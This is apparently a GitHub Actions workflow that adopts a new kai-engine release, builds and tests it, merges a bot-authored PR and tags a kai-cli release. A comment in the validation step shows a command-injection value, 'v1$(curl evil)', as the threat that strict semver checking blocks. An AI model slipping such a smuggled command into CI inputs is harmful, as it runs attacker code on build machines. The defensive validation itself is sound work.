name: adopt-engine
# Leaf of the cascade: when kai-engine releases, adopt it and release kai-cli
# automatically. Bump the engine version (go mod tidy also pulls the matching
# kai-core forward), build/test, commit to main, then tag the next kai-cli
# patch. That tag triggers the existing ci.yml, which builds the binaries and
# publishes to GCS + GitHub Releases.
#
# Pure versioned bump — no `replace` is added, so ci.yml's boundary job stays
# green. The bot pushes the bump commit + tag straight to main.
on:
  repository_dispatch:
    types: [engine-released]
  workflow_dispatch:
    inputs:
      version:
        description: kai-engine version to adopt (e.g. v0.3.0)
        required: true

concurrency:
  group: cli-release
  cancel-in-progress: false

permissions:
  contents: write
  pull-requests: write

env:
  GOPRIVATE: github.com/kaicontext/*

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - name: Resolve and validate target version
        id: v
        env:
          # The raw value comes from a repository_dispatch payload (untrusted).
          # Read it via env, never inline it into a later run-block: GitHub
          # substitutes ${{ }} into scripts BEFORE the shell parses them, so an
          # unvalidated 'v1$(curl evil)' would execute. Enforce strict semver
          # here; this also rejects an empty workflow_dispatch input.
          RAW_VERSION: ${{ github.event.client_payload.version || github.event.inputs.version }}
        run: |
          if ! printf '%s' "$RAW_VERSION" | grep -qE '^v[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "::error::invalid or empty version '$RAW_VERSION' (expected vMAJOR.MINOR.PATCH)"
            exit 1
          fi
          echo "version=$RAW_VERSION" >> "$GITHUB_OUTPUT"
      - name: Mint App token
        uses: actions/create-github-app-token@v3
        id: token
        with:
          client-id: ${{ secrets.KAI_CORE_APP_CLIENT_ID }}
          private-key: ${{ secrets.KAI_CORE_APP_PRIVATE_KEY }}
          owner: kaicontext
          repositories: kai-core,kai-engine,kai-cli
      - uses: actions/checkout@v5
        with:
          token: ${{ steps.token.outputs.token }}
          fetch-depth: 0
      - uses: actions/setup-go@v6
        with:
          go-version: '1.25'
      - name: Authenticate to private modules
        run: git config --global url."https://x-access-token:${{ steps.token.outputs.token }}@github.com/".insteadOf "https://github.com/"
      - name: Install build deps
        run: sudo apt-get update && sudo apt-get install -y gcc
      - name: Bump kai-engine, build, test
        env:
          VERSION: ${{ steps.v.outputs.version }}
        run: |
          go get "github.com/kaicontext/kai-engine@${VERSION}"
          go mod tidy
          CGO_ENABLED=1 go build ./...
          CGO_ENABLED=1 go test -timeout 5m -skip 'TestRunCompletion' ./...
      - name: Open a PR for the bump and tag the next kai-cli release
        env:
          VERSION: ${{ steps.v.outputs.version }}
          APP_SLUG: ${{ steps.token.outputs.app-slug }}
          GH_TOKEN: ${{ steps.token.outputs.token }}
        run: |
          # main is branch-protected: "changes must be made through a pull
          # request" (0 approvals) plus an extra approval for UNATTRIBUTED
          # commits. A direct `git push origin HEAD:main` is rejected with
          # GH013 — that is exactly what broke the v0.6.72 cascade. So: author
          # the commit AS THE APP BOT (attributed, so the unattributed rule does
          # not demand a review), push a branch, squash-merge the PR (0
          # approvals required, and the squash commit is app-authored = also
          # attributed), then tag the merged main. Tags are NOT branch-protected
          # (the GH013 rule is on refs/heads/main only), so tagging still
          # triggers ci.yml -> build + publish.
          bot_id=$(gh api "/users/${APP_SLUG}[bot]" --jq .id)
          git config user.name "${APP_SLUG}[bot]"
          git config user.email "${bot_id}+${APP_SLUG}[bot]@users.noreply.github.com"

          # Nothing to adopt AND already released -> nothing to do (re-run safe).
          if git diff --quiet go.mod go.sum && git describe --exact-match --tags HEAD >/dev/null 2>&1; then
            echo "go.mod already at ${VERSION} and HEAD is tagged $(git describe --exact-match --tags HEAD); nothing to release."
            exit 0
          fi

          # Next free strict-semver patch. `10#` forces base-10 (a zero-padded
          # component like 08 is never mis-read as octal); refresh tags and skip
          # any that already exist so a concurrent tag can't collide.
          git fetch --tags --force origin >/dev/null 2>&1 || true
          latest=$(git tag --list 'v*' --sort=-v:refname | grep -E '^v[0-9]+\.[0-9]+\.[0-9]+$' | head -1)
          latest=${latest:-v0.0.0}
          IFS=. read -r MA MI PA <<< "${latest#v}"
          next="v$((10#$MA)).$((10#$MI)).$((10#$PA + 1))"
          while git rev-parse -q --verify "refs/tags/$next" >/dev/null; do
            PA=$((10#$PA + 1)); next="v$((10#$MA)).$((10#$MI)).${PA}"
          done

          # Push the bump on a branch and open the PR. Commit ONLY the
          # dependency files, never a fixture a test may have dirtied.
          branch="release/engine-${VERSION}-${next}"
          git checkout -b "$branch"
          git commit go.mod go.sum -m "chore(deps): bump kai-engine to ${VERSION} (release ${next})"
          git push origin "$branch"
          gh pr create --base main --head "$branch" \
            --title "chore(deps): bump kai-engine to ${VERSION} (release ${next})" \
            --body "Automated engine adoption, cut as a PR because main is branch-protected. Triggered by kai-engine ${VERSION}; merging this tags ${next} and publishes via ci.yml."

          # 0 approvals + an attributed commit => mergeable as soon as GitHub has
          # computed mergeability. Retry to ride out that brief delay.
          merged=""
          for attempt in 1 2 3 4 5 6; do
            if gh pr merge "$branch" --squash --delete-branch; then merged=yes; break; fi
            echo "PR not mergeable yet (attempt $attempt) — waiting"
            sleep 8
          done
          if [ -z "$merged" ]; then
            echo "PR $branch did not merge after retries — leaving it open for a human" >&2
            exit 1
          fi

          # Tag the merged main. A lost race on the tag is a re-fetch-and-retry,
          # not a failure.
          for attempt in 1 2 3; do
            git fetch origin main --tags --force >/dev/null 2>&1 || true
            git tag -f "$next" origin/main
            if git push origin "refs/tags/$next"; then   # triggers ci.yml -> build + publish
              echo "Released kai-cli $next (engine ${VERSION}) via PR on $branch"
              exit 0
            fi
            echo "tag push rejected (attempt $attempt) — refreshing and retrying"
            git tag -d "$next" >/dev/null 2>&1 || true
          done
          echo "merged the bump but could not push tag $next — tag it manually" >&2
          exit 1
